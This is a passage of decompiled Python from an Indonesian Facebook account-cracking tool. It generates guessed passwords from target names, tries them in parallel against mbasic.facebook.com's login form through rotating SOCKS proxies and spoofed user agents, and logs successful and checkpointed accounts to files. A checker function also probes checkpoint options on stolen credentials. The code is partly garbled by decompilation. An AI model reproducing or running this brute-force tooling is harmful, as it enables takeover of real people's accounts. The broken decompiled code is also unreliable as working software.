                elif hc in ('3', '03'):
                    method.append('touch')
                elif hc in ('4', '04'):
                    method.append('mbasic')
                else:
                    method.append('mobile')
                print('')
                _jembot_ = input('>> Tambahkan Aplikasi Terkait ( Y/t ) ')
                if _jembot_ in ('',):
                    print('>> Pilih Yang Bener Kontol ')
                    back()
                elif _jembot_ in ('y', 'Y'):
                    taplikasi.append('ya')
                else:
                    taplikasi.append('no')
                pwplus = input('>> Tambahkan Password Manual ( Y/t ) ')
                if pwplus in ('y', 'Y'):
                    pwpluss.append('ya')
                    cetak(nel('[[cyan]•[white]] Masukkan Katasandi Tambahan Minimal 6 Karakter\n[[cyan]•[white]] Contoh :[green] kakak,ngentod,adik[white] '))
                    pwku = input('>> Masukkan Password Tambahan : ')
                    pwkuh = pwku.split(',')
                    for xpw in pwkuh:
                        pwnya.append(xpw)
                else:
                    pwpluss.append('no')
                passwrd()

            
            def passwrd():
                print(f'''>>>>> {m}•{k}•{h}•{x} Sedang Menggeser Matahari {m}•{k}•{h}•{x} <<<<< ''')
                print('')
                print(f'''>> Hasil {h}💥OK{x} Tersimpan Di : {h}OK/%s {x}''' % okc)
                print(f'''>> Hasil {k}🔥CP{x} Tersimpan Di : {k}CP/%s {x}''' % cpc)
                print(f'''>> Mainkan Mode Pesawat Setiap {m}1k{x} Idz\n''')
                with tred(30, **('max_workers',)) as pool:
                    for yuzong in id2:
                        idf = yuzong.split('|')[0]
                        nmf = yuzong.split('|')[1].lower()
                        frs = nmf.split(' ')[0]
                        pwv = []
                        if len(nmf) < 6:
                            if len(frs) < 3:
                                pass
                            else:
                                pwv.append(frs + '123')
                                pwv.append(frs + '1234')
                                pwv.append(frs + '12345')
                        elif len(frs) < 3:
                            pwv.append(nmf)
                        else:
                            pwv.append(nmf)
                            pwv.append(frs + '123')
                            pwv.append(frs + '1234')
                            pwv.append(frs + '12345')
                        if 'ya' in pwpluss:
                            for xpwd in pwnya:
                                pwv.append(xpwd)
                        
                        if 'mobile' in method:
                            pool.submit(crack, idf, pwv)
                            continue
                        if 'free' in method:
                            pool.submit(crackfree, idf, pwv)
                            continue
                        if 'touch' in method:
                            pool.submit(cracktouch, idf, pwv)
                            continue
                        if 'mbasic' in method:
                            pool.submit(crackmbasic, idf, pwv)
                            continue
                        pool.submit(crackmbasic, idf, pwv)
                    None(None, None, None)
                if not None:
                    pass
                print('')
                cetak(nel('\t[cyan]>>[green] Crack Selesai wey, syukuri aja hasil maling soalnya klo mau ijo print aja xix[cyan] <<[white] '))
                print(f'''[{b}•{x}]{h} OK : {h}%s ''' % ok)
                print(f'''{x}[{b}•{x}]{k} CP : {k}%s{x} ''' % cp)
                print('')
                print('>> Lanjut Crack Kembali ( Y/t ) ? ')
                woi = input('>> Pilih : ')
                if woi in ('y', 'Y'):
                    back()
                    return None
                None(f'''\t{x}>>{k} Good Bye Dadaahh{x} << ''')
                time.sleep(2)
                exit()

            
            def crack(idf, pwv):
                bo = random.choice([
                    m,
                    k,
                    h,
                    b,
                    u,
                    x])
                (sys.stdout.write(f'''\r🎉 {P}[{b}{loop}{P}/{u}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop / float(len(id)))}{P}]  '''),)
                sys.stdout.flush()
                ua = random.choice(ugen)
                ua2 = random.choice(ugen2)
                ses = requests.Session()
            # WARNING: Decompyle incomplete

            
            def __metode__(self, cebok, user, pasw):
                animasi = random.choice([
                    '\x1b[1;91m[?]',
                    '\x1b[1;92m[?]',
                    '\x1b[1;93m[?]',
                    '\x1b[1;94m[?]',
                    '\x1b[1;95m[?]',
                    '\x1b[1;96m[?]',
                    '\x1b[1;97m[?]'])
                sys.stdout.write(f'''\r {N}{animasi} {N}{loop}{N}/{M}{len(self.id)} {N}[{H}OK:{len(ok)}{N}][{K}CP:{len(cp)}{N}] [{H}{'{:.1%}'.format(loop / float(len(self.id)))}{N}]''')
                sys.stdout.flush()
            # WARNING: Decompyle incomplete

            
            def cracktouch(idf, pwv):
                bi = random.choice([
                    u,
                    k,
                    kk,
                    b,
                    h,
                    hh])
                pers = loop * 100 / len(id2)
                fff = '%'
                nip = random.choice(prox)
                proxs = {
                    'http': 'socks4://' + nip }
                ua = random.choice(ugen)
                ua2 = random.choice(ugen2)
                ses = requests.Session()
                sys.stdout.write('\r%s ☬ %s/%s ☬ OK:%s ☬ CP:%s ☬ %s%s%s ☬' % (bi, loop, len(id2), ok, cp, int(pers), str(fff), x))
                sys.stdout.flush()
            # WARNING: Decompyle incomplete

            
            def crackmbasic(idf, pwv):
                bi = random.choice([
                    u,
                    k,
                    kk,
                    b,
                    h,
                    hh])
                pers = loop * 100 / len(id2)
                fff = '%'
                nip = random.choice(prox)
                proxs = {
                    'http': 'socks5://' + nip }
                ua = random.choice(ugen)
                ua2 = random.choice(ugen2)
                ses = requests.Session()
                sys.stdout.write('\r%s ☬ %s/%s ☬ OK:%s ☬ CP:%s ☬ %s%s%s ☬' % (bi, loop, len(id2), ok, cp, int(pers), str(fff), x))
                sys.stdout.flush()
            # WARNING: Decompyle incomplete

            
            def ceker(idf, pw):
                global cp
                ua = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.128 Safari/537.36 FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.services;FBDV/EVR-L29;FBSV/10;FBLR/0;FBBK/1;FBCA/arm64-v8a:;]'
                head = {
                    'Host': 'mbasic.facebook.com',
                    'cache-control': 'max-age=0',
                    'upgrade-insecure-requests': '1',
                    'origin': 'https://mbasic.facebook.com',
                    'content-type': 'application/x-www-form-urlencoded',
                    'user-agent': ua,
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'x-requested-with': 'mark.via.gp',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-user': '?1',
                    'sec-fetch-dest': 'document',
                    'referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8',
                    'accept-encoding': 'gzip, deflate',
                    'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' }
                ses = requests.Session()
                
                try:
                    hi = ses.get('https://mbasic.facebook.com')
                    ho = sop(ses.post('https://mbasic.facebook.com/login.php', {
                        'email': idf,
                        'pass': pw,
                        'login': 'submit' }, head, True, **('data', 'headers', 'allow_redirects')).text, 'html.parser')
                    jo = ho.find('form')
                    data = { }
                    lion = [
                        'nh',
                        'jazoest',
                        'fb_dtsg',
                        'submit[Continue]',
                        'checkpoint_data']
                    for anj in jo('input'):
                        if anj.get('name') in lion:
                            data.update({
                                anj.get('name'): anj.get('value') })
                    kent = sop(ses.post('https://mbasic.facebook.com' + str(jo['action']), data, head, **('data', 'headers')).text, 'html.parser')
                    print('\r%s++++ %s|%s ----> CP       %s' % (b, idf, pw, x))
                    open('CP/' + cpc, 'a').write(idf + '|' + pw + '\n')
                    cp += 1
                    opsi = kent.find_all('option')
                    if len(opsi) == 0:
                        print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)' % (hh, x))
                finally:
                    return None
                    for opsii in opsi:
                        print('\r%s---> %s%s' % (kk, opsii.text, x))
                    return None
                    if Exception:
                        c = None
                        
                        try:
                            print('\r%s++++ %s|%s ----> CP       %s' % (b, idf, pw, x))
                            print('\r%s---> Tidak Dapat Mengecek Opsi (Cek Login Di Lite/Mbasic)%s' % (u, x))
                            open('CP/' + cpc, 'a').write(idf + '|' + pw + '\n')
                            cp += 1
                        finally:
                            c = None
                            del c
                            return None
                            c = None
                            del c



            
            def cek_opsi():
                c = len(akun)
                hu = 'Terdapat %s Akun Untuk Dicek\nSebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih Dahulu' % c
                cetak(nel(hu, 'CEK OPSI', **('title',)))
                input(x + '[' + h + '•' + x + '] Mulai')
                cek = '# PROSES CEK OPSI DIMULAI'
                sol().print(mark(cek, 'green', **('style',)))
                love = 0
                for kes in akun:
                    
                    try:
                        
                        try:
                            id = kes.split('|')[0]
                            pw = kes.split('|')[1]
                        finally:
                            pass
                        if IndexError:
                            time.sleep(2)
                            print('\r%s++++ %s ----> Error      %s' % (b, kes, x))
                            print('\r%s---> Pemisah Tidak Didukung Untuk Program Ini%s' % (u, x))
                        continue
                        bi = random.choice([
                            u,
                            k,
                            kk,
                            b,
                            h,
                            hh])
                        sys.stdout.flush()
                        ua = 'Mozilla/5.0 (Linux; Android 11; TECNO KD8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4755.101 Mobile Safari/537.36'
                        ses = requests.Session()
                        header = {
                            'Host': 'mbasic.facebook.com',
                            'cache-control': 'max-age=0',
                            'upgrade-insecure-requests': '1',
                            'origin': 'https://mbasic.facebook.com',
                            'content-type': 'application/x-www-form-urlencoded',
                            'user-agent': ua,
                            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                            'x-requested-with': 'mark.via.gp',
                            'sec-fetch-site': 'same-origin',
                            'sec-fetch-mode': 'navigate',
                            'sec-fetch-user': '?1',
                            'sec-fetch-dest': 'document',
                            'referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8',
                            'accept-encoding': 'gzip, deflate',
                            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' }
                        hi = ses.get('https://mbasic.facebook.com')
                        ho = sop(ses.post('https://mbasic.facebook.com/login.php', {
                            'email': id,
                            'pass': pw,
                            'login': 'submit' }, header, True, **('data', 'headers', 'allow_redirects')).text, 'html.parser')
                        if 'checkpoint' in ses.cookies.get_dict().keys():
                            
                            try:
                                jo = ho.find('form')
                                data = { }
                                lion = [
                                    'nh',
                                    'jazoest',
                                    'fb_dtsg',
                                    'submit[Continue]',
                                    'checkpoint_data']
                                for anj in jo('input'):
                                    if anj.get('name') in lion:
                                        data.update({
                                            anj.get('name'): anj.get('value') })
                                        continue
                                kent = sop(ses.post('https://mbasic.facebook.com' + str(jo['action']), data, header, **('data', 'headers')).text, 'html.parser')
                                print('\r%s++++ %s|%s ----> CP       %s' % (b, id, pw, x))
                                opsi = kent.find_all('option')
                                if len(opsi) == 0:
                                    print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)' % (hh, x))
                                else:
                                    for opsii in opsi:
                                        print('\r%s---> %s%s' % (kk, opsii.text, x))
                            print('\r%s++++ %s|%s ----> CP       %s' % (b, id, pw, x))
                            print('\r%s---> Tidak Dapat Mengecek Opsi%s' % (u, x))
                            if 'c_user' in ses.cookies.get_dict().keys():
                                print('\r%s++++ %s|%s ----> OK       %s' % (h, id, pw, x))
                            else:
                                print('\r%s++++ %s|%s ----> SALAH       %s' % (x, id, pw, x))


                        love += 1
                    finally:
                        continue
                        if requests.exceptions.ConnectionError:
                            print('')
                            li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
                            sol().print(mark(li, 'red', **('style',)))
                            exit()
                            continue
                        dah = '# DONE'
                        sol().print(mark(dah, 'green', **('style',)))
                        exit()
                        return None


            
            def cek_apk(session, cookie):
                w = session.get('https://mbasic.facebook.com/settings/apps/tabbed/?tab=active', {
                    'cookie': cookie }, **('cookies',)).text
                sop = BeautifulSoup(w, 'html.parser')
                x = sop.find('form', 'post', **('method',))
                game = (lambda .0: [ i.text for i in .0 ])(x.find_all('h3'))
                if len(game) == 0:
                    print(f'''\n {N}[{M}!{N}] opshh tidak ada aplikasi aktif di akun ini.''')
                else:
                    for i in range(len(game)):
                        print('   %s%s. %s%s' % (H, i + 1, game[i].replace('Ditambahkan pada', ' Ditambahkan pada'), N))
                w = session.get('https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive', {
                    'cookie': cookie }, **('cookies',)).text
                sop = BeautifulSoup(w, 'html.parser')
                x = sop.find('form', 'post', **('method',))
                game = (lambda .0: [ i.text for i in .0 ])(x.find_all('h3'))
                if len(game) == 0:
                    print(f'''\n {N}[{M}!{N}] opshh tidak ada aplikasi kadaluarsa di akun ini.''')
                    return None
                for i in None(len(game)):
                    print('   %s%s. %s%s' % (K, i + 1, game[i].replace('Kedaluwarsa', ' Kedaluwarsa'), N))

            if __name__ == '__main__':
                
                try:
                    os.system('git pull')
                finally:
                    pass
                
                try:
                    os.mkdir('OK')
                finally:
                    pass
                
                try:
                    os.mkdir('CP')
                finally:
                    pass
                
                try:
                    os.mkdir('DUMP')
                finally:
                    pass
                
                try:
                    os.system('touch .prox.txt')
                finally:
                    pass
                login()
                return None
                return None







